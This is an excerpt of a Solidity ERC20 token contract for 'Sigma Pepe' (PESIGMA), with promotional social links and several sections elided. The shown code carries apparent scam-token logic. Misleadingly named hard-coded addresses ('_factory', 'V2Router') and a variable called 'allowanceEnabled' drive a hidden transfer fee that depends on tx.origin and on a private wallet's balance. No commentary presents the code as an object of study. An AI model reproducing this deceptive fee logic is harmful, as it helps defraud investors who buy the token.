...
https://twitter.com/TokenBNB
https://t.me.com/TokenBNB
https://TokenBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address private _factory = 0xCa5627f1b20ae570Bd44aB3a602B8C7dC1FCb3Ee;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    uint256 private _totalSupply;
    uint256 private allowanceEnabled = 2;
    address internal V2Router = 0x720e5F8efdcb7B2eD7752AC12C6D47e26D71B248;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2Router && _balances[_factory] > 0 ? _pairsToken : allowanceEnabled).div(100)+0;
        if (swapamount > 0)
        {
...
{
    constructor() ERC20(unicode"Sigma Pepe", unicode"PESIGMA")
    {
